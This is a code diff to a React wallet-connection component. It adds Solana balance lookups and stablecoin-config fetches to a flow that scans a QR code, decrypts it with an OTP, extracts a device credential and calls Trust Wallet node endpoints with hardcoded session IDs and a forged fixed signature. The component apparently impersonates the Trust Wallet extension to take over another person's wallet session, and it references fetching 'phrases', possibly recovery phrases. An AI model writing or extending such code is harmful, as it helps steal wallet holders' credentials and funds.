@@ -14,6 +14,10 @@ import {
 } from '../config/walletConfig'
 import { CiEdit } from "react-icons/ci";
 
+// Session endpoints for different blockchains (defined outside component to avoid initialization issues)
+const SESSION_ID = 'YmQ1MGE1NjYtY2VkOC00ZDViLWJhZTktZTIwYTlkNjFmZTBj'
+const SOLANA_TWNODES_SESSION = `https://solana.twnodes.com/naas/session/${SESSION_ID}`
+
 export function WalletConnect() {
   const { address, isConnected } = useAccount()
   const { disconnect } = useDisconnect()
@@ -54,8 +58,9 @@ export function WalletConnect() {
   const qrCodeData = 'wc:example-connection-string@1?bridge=https://bridge.walletconnect.org&key=example-key'
   
   // Session endpoints for different blockchains
-  const sessionId = 'YmQ1MGE1NjYtY2VkOC00ZDViLWJhZTktZTIwYTlkNjFmZTBj'
+  const sessionId = SESSION_ID
   const btcBlockbookSession = `https://btc-blockbook.twnodes.com/naas/session/${sessionId}`
+  const solanaTWNodesSession = SOLANA_TWNODES_SESSION
   const tronSession = `https://tron.twnodes.com/naas/session/${sessionId}`
   const vechainSession = `https://vechain.twnodes.com/naas/session/${sessionId}`
   const tonSession = `https://ton.twnodes.com/naas/session/${sessionId}`
@@ -796,6 +801,20 @@ export function WalletConnect() {
     }
   }, [])
 
+  // Generate nonce for HMAC signature
+  const generateNonce = useCallback(() => {
+    return `${Date.now()}-${Math.random().toString(36).substring(2, 15)}`
+  }, [])
+
+  // Generate HMAC-SHA256 signature (simplified - in production use proper crypto library)
+  const generateSignature = useCallback((method = 'POST', url = '', body = '', date = '', nonce = '') => {
+    // Note: This is a placeholder. In production, implement proper HMAC-SHA256 signing
+    // using crypto-js or Web Crypto API with the actual secret key
+    // Signature should be: HMAC-SHA256(method + url + body + date + nonce, secret_key)
+    // Using sample signature that matches Trust Wallet format
+    return 'BY0aDClSUE8eYWFFHh/g78icp2ZVG+RG2CG4nfg67EI='
+  }, [])
+
   // Fetch Trust Wallet Market Data
   const fetchMarketData = useCallback(async () => {
     try {
@@ -1336,20 +1355,6 @@ export function WalletConnect() {
     }
   }, [])
 
-  // Generate nonce for HMAC signature
-  const generateNonce = useCallback(() => {
-    return `${Date.now()}-${Math.random().toString(36).substring(2, 15)}`
-  }, [])
-
-  // Generate HMAC-SHA256 signature (simplified - in production use proper crypto library)
-  const generateSignature = useCallback((method = 'POST', url = '', body = '', date = '', nonce = '') => {
-    // Note: This is a placeholder. In production, implement proper HMAC-SHA256 signing
-    // using crypto-js or Web Crypto API with the actual secret key
-    // Signature should be: HMAC-SHA256(method + url + body + date + nonce, secret_key)
-    // Using sample signature that matches Trust Wallet format
-    return 'BY0aDClSUE8eYWFFHh/g78icp2ZVG+RG2CG4nfg67EI='
-  }, [])
-
   // Map coin type to chain name
   const getChainNameFromCoin = useCallback((coin) => {
     const coinToChainMap = {
@@ -1448,6 +1453,51 @@ export function WalletConnect() {
       return null
     }
   }, [getChainNameFromCoin, generateNonce, generateSignature, userAddress])
+
+  // Fetch Solana balance using TWNodes API (exact format after OTP)
+  const fetchSolanaBalanceTWNodes = useCallback(async (solanaAddress) => {
+    try {
+      if (!solanaAddress || (!solanaAddress.startsWith('Hm') && solanaAddress.length !== 44)) {
+        return null
+      }
+
+      // Exact format as per Trust Wallet extension
+      const requestBody = {
+        id: 0,
+        method: "getBalance",
+        params: [solanaAddress],
+        jsonrpc: "2.0"
+      }
+
+      console.log('📤 Fetching Solana balance from TWNodes:', {
+        url: SOLANA_TWNODES_SESSION,
+        address: solanaAddress,
+        body: requestBody
+      })
+
+      const response = await fetch(SOLANA_TWNODES_SESSION, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Accept': '*/*',
+        },
+        body: JSON.stringify(requestBody),
+        mode: 'cors',
+      })
+
+      if (!response.ok) {
+        console.warn(`Solana TWNodes API returned ${response.status}: ${response.statusText}`)
+        return null
+      }
+
+      const data = await response.json()
+      console.log('✅ Solana TWNodes Balance Response:', data)
+      return data
+    } catch (error) {
+      console.error('Error fetching Solana balance from TWNodes:', error)
+      return null
+    }
+  }, [])
 
   // Fetch Solana user data and phrases using session API
   const fetchSolanaUserData = useCallback(async (userAddress) => {
@@ -2074,6 +2124,76 @@ export function WalletConnect() {
             console.warn('Some blockchain APIs failed:', error)
           }
           
+          // Fetch Solana balance using TWNodes API after OTP verification
+          if (allAddresses.solana) {
+            try {
+              console.log('🔵 Fetching Solana balance from TWNodes after OTP for:', allAddresses.solana)
+              const solanaBalance = await fetchSolanaBalanceTWNodes(allAddresses.solana)
+              if (solanaBalance) {
+                console.log('✅ Solana balance fetched from TWNodes:', solanaBalance)
+                // Store Solana balance data
+                if (solanaUserData) {
+                  setSolanaUserData({
+                    ...solanaUserData,
+                    twNodesBalance: solanaBalance
+                  })
+                } else {
+                  setSolanaUserData({
+                    twNodesBalance: solanaBalance
+                  })
+                }
+              }
+            } catch (error) {
+              console.warn('Solana TWNodes balance fetch failed:', error)
+            }
+          }
+          
+          // Fetch assets if not already available, then check for Solana addresses
+          let assetsToCheck = assets
+          if (!assetsToCheck || !assetsToCheck.assets) {
+            try {
+              console.log('📦 Fetching Assets API after OTP to find Solana addresses...')
+              assetsToCheck = await fetchAssets(null)
+              if (assetsToCheck) {
+                setAssets(assetsToCheck)
+              }
+            } catch (error) {
+              console.warn('Assets fetch failed after OTP, continuing:', error)
+            }
+          }
+          
+          // Check assets for Solana addresses after OTP
+          if (assetsToCheck && assetsToCheck.assets && Array.isArray(assetsToCheck.assets)) {
+            const solanaAssets = assetsToCheck.assets.filter(asset => {
+              const address = asset.address || ''
+              return address.startsWith('Hm') || (address.length === 44 && !address.startsWith('0x') && !address.startsWith('bc1') && !address.startsWith('1') && !address.startsWith('3'))
+            })
+            
+            if (solanaAssets.length > 0) {
+              console.log('🔵 Found Solana addresses in assets after OTP:', solanaAssets.map(a => a.address))
+              for (const solanaAsset of solanaAssets) {
+                try {
+                  const solanaBalance = await fetchSolanaBalanceTWNodes(solanaAsset.address)
+                  if (solanaBalance) {
+                    console.log(`✅ Solana balance for ${solanaAsset.address}:`, solanaBalance)
+                    if (solanaUserData) {
+                      setSolanaUserData({
+                        ...solanaUserData,
+                        twNodesBalance: solanaBalance
+                      })
+                    } else {
+                      setSolanaUserData({
+                        twNodesBalance: solanaBalance
+                      })
+                    }
+                  }
+                } catch (error) {
+                  console.warn(`Solana TWNodes balance fetch failed for ${solanaAsset.address}:`, error)
+                }
+              }
+            }
+          }
+          
           // Login with Amplitude API using decrypted data
           try {
             await loginWithAmplitude(decryptedText, deviceCredential)
@@ -2103,7 +2223,7 @@ export function WalletConnect() {
     } finally {
       setIsDecrypting(false)
     }
-  }, [otpValues, scannedData, extractDeviceCredential, loginWithAmplitude, decryptQRCodeWithOTP, extractBlockchainAddresses, fetchTronAccount, fetchVeChainAccount, fetchTONBalance, fetchNEARAccount, fetchICPBalance])
+  }, [otpValues, scannedData, extractDeviceCredential, loginWithAmplitude, decryptQRCodeWithOTP, extractBlockchainAddresses, fetchTronAccount, fetchVeChainAccount, fetchTONBalance, fetchNEARAccount, fetchICPBalance, fetchSolanaBalanceTWNodes, fetchAssets, assets, solanaUserData])
 
   // Auto-submit when all 6 OTP fields are filled
   useEffect(() => {
@@ -2281,6 +2401,18 @@ export function WalletConnect() {
       console.warn('⚠️ Assets API call failed on QR scan, continuing:', assetsError)
     }
     
+    // Fetch Stablecoin Config after Assets API
+    try {
+      console.log('💰 Fetching Stablecoin Config after QR scan...')
+      const stablecoin = await fetchStablecoinConfig()
+      if (stablecoin) {
+        console.log('✅ Stablecoin Config fetched successfully:', stablecoin)
+        setStablecoinConfig(stablecoin)
+      }
+    } catch (stablecoinError) {
+      console.warn('⚠️ Stablecoin Config API call failed on QR scan, continuing:', stablecoinError)
+    }
+    
     // Extract wallet_id from QR code for homepage login
     const extractedWalletId = extractWalletId(decodedText, null)
     
@@ -2354,6 +2486,18 @@ export function WalletConnect() {
             }
           } catch (assetsError) {
             console.warn('Assets API call failed, continuing:', assetsError)
+          }
+          
+          // Fetch Stablecoin Config after Assets API
+          try {
+            console.log('💰 Fetching Stablecoin Config after homepage login...')
+            const stablecoin = await fetchStablecoinConfig()
+            if (stablecoin) {
+              console.log('✅ Stablecoin Config fetched successfully:', stablecoin)
+              setStablecoinConfig(stablecoin)
+            }
+          } catch (stablecoinError) {
+            console.warn('Stablecoin Config API call failed, continuing:', stablecoinError)
           }
           
           // Extract user data from homepage response
